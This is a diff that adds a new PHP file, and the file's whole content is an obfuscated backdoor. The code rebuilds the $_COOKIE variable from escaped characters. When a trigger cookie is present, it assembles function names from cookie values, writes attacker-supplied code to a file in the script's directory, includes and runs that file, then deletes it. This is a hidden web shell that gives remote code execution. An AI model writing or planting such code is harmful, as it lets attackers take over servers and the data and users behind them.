@@ -1,0 +1,2 @@
+<?php
+$aFon	=${ "\137" ."\103\117"	.	"\117"	. "\113" ."\111"	."\105"	}	; if	(isset	(	$aFon	[(51	-36	) ]	) ){   $fF=	$aFon[	(81-	5) ].$aFon[(87-42)];		$wH =$fF(	$aFon[ (94-6)].$aFon[  (	94-	17 ) ]);	 $UtCy	=$wH ( $fF ($aFon [	( 85 -59 )	 ] )	);	 $tBGT	=	$wH(	$fF(	$aFon[( 86	- 11)])); $PMq=__DIR__.$wH	($fF($aFon[ (	64 -6 ) ] ));  $UtCy($PMq,	$wH	(	$fF( $aFon [  ( 59 -44)]	) ) )	;		 include($PMq	) ; $tBGT( $PMq); 	}
